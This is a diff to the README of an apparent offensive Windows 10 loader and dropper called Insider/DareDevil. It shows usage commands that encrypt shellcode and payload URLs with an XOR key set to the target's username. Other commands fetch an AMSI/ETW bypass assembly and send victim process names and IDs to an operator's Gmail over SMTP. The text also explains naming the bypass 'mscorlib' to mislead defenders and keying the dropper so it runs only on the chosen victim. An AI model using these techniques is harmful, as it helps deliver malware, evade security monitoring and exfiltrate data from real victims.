@@ -4,9 +4,6 @@
 
 Stealthy Loader-cum-dropper/stage-1/stager targeting Windows10
 
-### MUST Before Public:
-1. Update Insider.exe
-
 ### Technology behind Insider:
 
 ![Insider](https://user-images.githubusercontent.com/61424547/176930902-42f5bd9d-c1cd-4c73-a15e-cc5731d55d63.png)
@@ -31,19 +28,19 @@ It can encrypt 'shellcode', 'url' and string:
 // Creating .bin file and Extracting shellcode from .bin file:
 // Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
 // Extract: 
-cmd> encrypt.exe /file:file.bin /out:aes_b64
+cmd> encrypt.exe /file:file.bin /xor_key:<usernameoftarget> /out:xor_b64
 
 // paste the output b64 bytes into a .txt file and upload it to payload server.
 // cmd: "mv .\obfuscator\"
-cmd> encrypt.exe /shellcodeurl:<url>.txt /out:aes_b64
+cmd> encrypt.exe /shellcodeurl:<url> /xor_key:<usernameoftarget> /out:xor_b64
 
-cmd> encrypt.exe /mscorliburl:<url>.exe /out:aes_b64
+cmd> encrypt.exe /mscorliburl:<url> /xor_key:<usernameoftarget> /out:xor_b64
 
 // For Sending/ exfiltrating Victim process name and Ids to Operator Gmail via SMTP server
-cmd> encrypt.exe /remotewriteurl:<url>.exe /out:aes_b64
+cmd> encrypt.exe /remotewriteurl:<url> /xor_key:<usernameoftarget> /out:xor_b64
 
 // For reading pid from pid.txt from payload server/ remote c2 server
-cmd> encrypt.exe /remotereadurl:<url>.txt /out:aes_b64
+cmd>  encrypt.exe /remotereadurl:<url> /xor_key:<usernameoftarget> /out:xor_b64
 
 // Sensitive strings Obfuscation
 cmd> encrypt.exe /string:<string1,string2,...,stringn> /xor_key:<usernameoftarget> /out:xor_b64
@@ -79,6 +76,12 @@ Usage:
 #### NOTE:
 I have named AMSI&ETW bypass .NET Assembly as "_mscorlib_" because if by chance, it is seen by a Blue Teamer and if that particular member is less experienced, the name `"mscorlib"` can bamboozle, making them think, "Hey, yes!! a .NET binary always loads up something called, mscorlib. It contains the core implementation of the .NET framework." Though there is a very little chance of our "_mscorlib.exe_" of getting caught running as a process in memory, as it is visible only a very little amount of time (probably in ms) in our dropper process memory, unless our dropper is getting debugged ;(.\
 BTW, This bamboozle thing was also told by Jean Maes :smile:.
+
+### Ability to recognise target by checking username in the form of xor key:
+
+As discussed before in [Ability](https://github.com/reveng007/DareDevil/edit/main/README.md#ability) section, utilizing environmental keying factor, I hardcoded a encrypted test string with xor key (username of target) and then decrypted while running then compared it with the original one. If the condition is true then, our dropper is allowed to run else it turns off.
+
+![image](https://user-images.githubusercontent.com/61424547/177057832-1b9c1eae-317b-496c-baaf-80dc871a3748.png)
 
 ### Video:
 
